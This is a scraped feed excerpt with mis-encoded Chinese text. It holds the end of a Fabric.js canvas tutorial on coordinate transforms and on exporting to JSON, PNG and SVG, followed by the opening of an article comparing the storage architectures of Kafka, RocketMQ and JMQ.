<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/856a6df7b0ed4ce5b90f80bfd8415ddf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=jqyqbUb2gFXwbkMoWnhP3nOPyjA%3D" alt="recording.gif" loading="lazy"/></p>
<p>ä»ä¸Šå›¾å¯è§ï¼Œå½“canvasæœªå¹³ç§»æˆ–ç¼©æ”¾æ—¶ï¼Œå¯ä»¥å¾ˆç®€å•çš„è·å–ç›¸åº”ç‚¹ä½ç½®ï¼Œä½†æ˜¯ä¸€ä½†å¹³ç§»æˆ–è€…ç¼©æ”¾åï¼Œé¼ æ ‡ç‚¹çš„ä½ç½®å°±å…¨ä¹±äº†ã€‚Fabric.js æä¾›äº† <strong>transformPoint</strong> æ–¹æ³•è§£å†³è¿™ä¸€é—®é¢˜ã€‚</p>
<ul>
<li>
<p><strong>fabric.util.transformPoint(Point, transform)</strong> :</p>
<ul>
<li>å°†Canvasåæ ‡ç‚¹è½¬æ¢ä¸ºè§†å£åæ ‡ç‚¹</li>
<li>ä¾‹å¦‚ï¼š<em>fabric.util.transformPoint(new fabric.Point(100, 100), canvas.viewportTransform)</em> ï¼Œå°†è§†å£çš„ï¼ˆ100,100ï¼‰åæ ‡ç‚¹è½¬åŒ–ä¸ºå¹³ç§»ç¼©æ”¾åçš„åæ ‡ç‚¹ã€‚</li>
</ul>
</li>
<li>
<p><strong>Canvas.getPointer(event)</strong> :</p>
<ul>
<li>ç”¨äºè·å–äº‹ä»¶ï¼ˆå¦‚é¼ æ ‡æˆ–è§¦æ‘¸äº‹ä»¶ï¼‰å‘ç”Ÿæ—¶ç›¸å¯¹äºç”»å¸ƒçš„åæ ‡ã€‚å®ƒè€ƒè™‘äº†å½“å‰è§†å£çš„å˜æ¢ï¼ˆåŒ…æ‹¬å¹³ç§»å’Œç¼©æ”¾ï¼‰ï¼Œå› æ­¤å¯ä»¥æ­£ç¡®åœ°å°†é¼ æ ‡æˆ–è§¦æ‘¸äº‹ä»¶çš„å±å¹•åæ ‡è½¬æ¢ä¸ºç”»å¸ƒåæ ‡ã€‚</li>
</ul>
</li>
</ul>
<p>ä¿®æ”¹ä»£ç ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">      <span class="hljs-comment">// å½“é¼ æ ‡æŒ‰ä¸‹æ—¶</span>
      canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:down'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">option</span>) {
        <span class="hljs-keyword">const</span> evt = option.<span class="hljs-property">e</span>;
        <span class="hljs-comment">// ç”¨transformPointåˆ›å»ºä¸€ä¸ªå°æ–¹å—</span>
        <span class="hljs-comment">// æ³¨æ„ transformPoint ä½œç”¨æ˜¯å°†ä¸€ä¸ªåæ ‡ä»ä¸€ä¸ªåæ ‡ç³»è½¬æ¢åˆ°å¦ä¸€ä¸ªåæ ‡ç³»</span>
        <span class="hljs-comment">// ç”±äºè¿™é‡Œçš„å°†æŒ‰ä¸‹çš„è§†å£åæ ‡è½¬æ¢æˆ canvasç”»å¸ƒåæ ‡ç³»ï¼Œæ‰€ä»¥éœ€è¦ç”¨ invertTransform åè½¬å˜æ¢</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
          <span class="hljs-attr">left</span>: fabric.<span class="hljs-property">util</span>.<span class="hljs-title function_">transformPoint</span>({ <span class="hljs-attr">x</span>: evt.<span class="hljs-property">offsetX</span>, <span class="hljs-attr">y</span>: evt.<span class="hljs-property">offsetY</span> },  fabric.<span class="hljs-property">util</span>.<span class="hljs-title function_">invertTransform</span>(canvas.<span class="hljs-property">viewportTransform</span>)).<span class="hljs-property">x</span>,
          <span class="hljs-attr">top</span>: fabric.<span class="hljs-property">util</span>.<span class="hljs-title function_">transformPoint</span>({ <span class="hljs-attr">x</span>: evt.<span class="hljs-property">offsetX</span>, <span class="hljs-attr">y</span>: evt.<span class="hljs-property">offsetY</span> }, fabric.<span class="hljs-property">util</span>.<span class="hljs-title function_">invertTransform</span>(canvas.<span class="hljs-property">viewportTransform</span>)).<span class="hljs-property">y</span>,
          <span class="hljs-attr">width</span>: <span class="hljs-number">50</span>,
          <span class="hljs-attr">height</span>: <span class="hljs-number">50</span>,
          <span class="hljs-attr">fill</span>: <span class="hljs-string">'red'</span>
        }))
        <span class="hljs-comment">// ç”¨getPointeråˆ›å»ºä¸€ä¸ªå°æ–¹å—</span>
        <span class="hljs-keyword">const</span> pointer = canvas.<span class="hljs-title function_">getPointer</span>(evt);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'potint, '</span>, pointer)
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
          <span class="hljs-attr">left</span>: pointer.<span class="hljs-property">x</span>,
          <span class="hljs-attr">top</span>: pointer.<span class="hljs-property">y</span>,
          <span class="hljs-attr">width</span>: <span class="hljs-number">50</span>,
          <span class="hljs-attr">height</span>: <span class="hljs-number">50</span>,
          <span class="hljs-attr">fill</span>: <span class="hljs-string">'blue'</span>
        }))
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderAll</span>();
      });
</code></pre>
<p>æ³¨æ„ transformPoint ä½œç”¨æ˜¯å°†ä¸€ä¸ªåæ ‡ä»ä¸€ä¸ªåæ ‡ç³»è½¬æ¢åˆ°å¦ä¸€ä¸ªåæ ‡ç³»ï¼Œç”±äºè¿™é‡Œçš„å°†æŒ‰ä¸‹çš„è§†å£åæ ‡è½¬æ¢æˆ canvasç”»å¸ƒåæ ‡ç³»ï¼Œæ‰€ä»¥éœ€è¦ç”¨ invertTransform åè½¬å˜æ¢ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30e0350fbec0494a87e39c57b2a16121~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=Cpq2RZjIIR6DA%2B%2Bxv6ecXBBjMTs%3D" alt="3C730B8B-C74E-4BD5-B5DA-B66851E96B6C.gif" loading="lazy"/></p>
<h2 data-id="heading-55">åºåˆ—åŒ–</h2>
<h3 data-id="heading-56">è¾“å‡ºJSON</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// åˆå§‹åŒ–ç”»å¸ƒ</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'canvas stringify '</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(canvas))
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'canvas toJSON'</span>, canvas.<span class="hljs-title function_">toJSON</span>())
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'canvas toObject'</span>, canvas.<span class="hljs-title function_">toObject</span>())
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>æ‰“å¼€æ§åˆ¶å°å¯ä»¥çœ‹åˆ°è¾“å‡ºã€‚</p>
<h3 data-id="heading-57">è¾“å‡ºbase64</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// åˆå§‹åŒ–ç”»å¸ƒ</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>, {
    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'#a5dee5'</span>
  })

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'green'</span>
  })

  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">80</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">80</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">"red"</span>
  })

  canvas.<span class="hljs-title function_">add</span>(rect, circle)

  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'toPng'</span>, canvas.<span class="hljs-title function_">toDataURL</span>(<span class="hljs-string">'png'</span>)) <span class="hljs-comment">// åœ¨æ§åˆ¶å°è¾“å‡º pngï¼ˆbase64ï¼‰</span>
  canvas.<span class="hljs-title function_">requestRenderAll</span>()
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-58">è¾“å‡º SVG</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// åˆå§‹åŒ–ç”»å¸ƒ</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>, {
    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'#a5dee5'</span>
  })

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'green'</span>
  })

  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">80</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">80</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">"red"</span>
  })

  canvas.<span class="hljs-title function_">add</span>(rect, circle)

  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(canvas.<span class="hljs-title function_">toSVG</span>()) <span class="hljs-comment">// è¾“å‡º SVG</span>
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-59">ååºåˆ—åŒ–</h2>
<p>ååºåˆ—åŒ–å°±æ˜¯æŠŠ <code>JSON</code> æ•°æ®æ¸²æŸ“åˆ°ç”»å¸ƒä¸Šã€‚</p>
<p>é€šå¸¸æŠŠä»åå°è¯·æ±‚å›æ¥çš„æ•°æ®æ¸²æŸ“åˆ°ç”»å¸ƒä¸Šã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> jsonStr = <span class="hljs-string">''</span>

  <span class="hljs-comment">// åˆå§‹åŒ–ç”»å¸ƒ</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// ååºåˆ—åŒ–</span>
  canvas.<span class="hljs-title function_">loadFromJSON</span>(jsonStr)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-60">æ€»ç»“</h2>
<p>å†™åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å·²ç»æŠŠ Fabric.js å¸¸è§åŠŸèƒ½éƒ½è¿‡äº†ä¸€éã€‚å¦‚æœä½ åšæŒçœ‹åˆ°è¿™é‡Œï¼Œæ­å–œä½ ï¼ä½ å·²ç»å…·å¤‡æ„å»ºä¸€ä¸ªç®€å•ç”»æ¿/æµ·æŠ¥ç¼–è¾‘å™¨/å¯è§†åŒ–å·¥å…·çš„åŸºç¡€èƒ½åŠ›ã€‚</p>
<p>Fabric.js æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å‰ç«¯ Canvas åº“ï¼Œéšç€ä½ ä¸æ–­å®è·µï¼Œä½ ä¼šå‘ç°å®ƒèƒ½åšçš„äº‹æƒ…è¿œä¸æ­¢æœ¬æ–‡å±•ç¤ºçš„è¿™äº›ã€‚</p>
<p>å¦‚æœä½ æœ‰ä»€ä¹ˆæƒ³æ³•ã€é—®é¢˜æˆ–å¸Œæœ›æˆ‘ç»§ç»­å†™çš„æ–¹å‘ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºå‘Šè¯‰æˆ‘ï¼Œæˆ‘ä¼šæŒç»­æ›´æ–°æ›´å¤šç›¸å…³å†…å®¹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kafkaã€RocketMQã€JMQ å­˜å‚¨æ¶æ„æ·±åº¦å¯¹æ¯”]]></title>    <link>https://juejin.cn/post/7595185093834244131</link>    <guid>https://juejin.cn/post/7595185093834244131</guid>    <pubDate>2026-01-15T09:20:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595185093834244131" data-draft-id="7595403248594272256" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kafkaã€RocketMQã€JMQ å­˜å‚¨æ¶æ„æ·±åº¦å¯¹æ¯”"/> <meta itemprop="keywords" content="æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-15T09:20:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äº¬ä¸œé›¶å”®æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/4233576972293643"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kafkaã€RocketMQã€JMQ å­˜å‚¨æ¶æ„æ·±åº¦å¯¹æ¯”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4233576972293643/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äº¬ä¸œé›¶å”®æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T09:20:19.000Z" title="Thu Jan 15 2026 09:20:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ¶ˆæ¯é˜Ÿåˆ—çš„å­˜å‚¨æ¶æ„æ˜¯å†³å®šå…¶å¯é æ€§ã€ååé‡ã€å»¶è¿Ÿæ€§èƒ½çš„æ ¸å¿ƒå› ç´ ï¼Œç›´æ¥å½±å“ä¸šåŠ¡åœºæ™¯é€‚é…èƒ½åŠ›ã€‚æœ¬æ–‡èšç„¦ä¸‰æ¬¾ä¸»æµæ¶ˆæ¯é˜Ÿåˆ— â€”â€”Kafkaï¼ˆLinkedIn å¼€æºï¼Œä¾§é‡é«˜ååï¼‰ã€RocketMQï¼ˆé˜¿é‡Œå¼€æºï¼Œé‡‘èçº§ç‰¹æ€§çªå‡ºï¼‰ã€JMQï¼ˆäº¬ä¸œå¼€æºï¼Œä¾§é‡é«˜å¯ç”¨ä¸çµæ´»æ€§ï¼‰ï¼Œä»å­˜å‚¨æ¨¡å‹ã€æ•°æ®ç»„ç»‡ã€ç´¢å¼•è®¾è®¡ç­‰ç»´åº¦å±•å¼€æ·±åº¦å¯¹æ¯”ï¼Œä¸ºæŠ€æœ¯é€‰å‹ä¸æ¶æ„ä¼˜åŒ–æä¾›å‚è€ƒã€‚</p>
<p>æœ¬æ–‡å°†ä»æ¦‚å¿µè¾¨æå‡ºå‘ï¼Œç³»ç»Ÿæ‹†è§£ä¸»æµå­˜å‚¨æ¨¡å‹ä¸å­˜å‚¨å¼•æ“çš„è®¾è®¡é€»è¾‘ï¼Œå¯¹æ¯” JMQã€Kafkaã€RocketMQçš„æŠ€æœ¯é€‰å‹å·®å¼‚ä¸æ¶æ„è®¾è®¡ã€‚</p>
<h2 data-id="heading-0">01.Kafkaå­˜å‚¨æ¶æ„</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/efa8e89877aa464e8efc2707c2e88445~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=xCOLo%2FDhAG7DLAFeNYvKNJzAGZQ%3D" alt="image.png" loading="lazy"/></p>
<p>Topic - ä¸»é¢˜</p>
<p>Kafkaå­¦ä¹ äº†æ•°æ®åº“é‡Œé¢çš„è®¾è®¡ï¼Œåœ¨é‡Œé¢è®¾è®¡äº†topicï¼ˆä¸»é¢˜ï¼‰ï¼Œè¿™ä¸ªä¸œè¥¿ç±»ä¼¼äºå…³ç³»å‹æ•°æ®åº“çš„è¡¨ï¼Œæ­¤æ—¶æˆ‘éœ€è¦è·å–ä¸­å›½ç§»åŠ¨çš„æ•°æ®ï¼Œé‚£å°±ç›´æ¥ç›‘å¬ä¸­å›½ç§»åŠ¨è®¢é˜…çš„Topicå³å¯ã€‚</p>
<p>Partition - åˆ†åŒº</p>
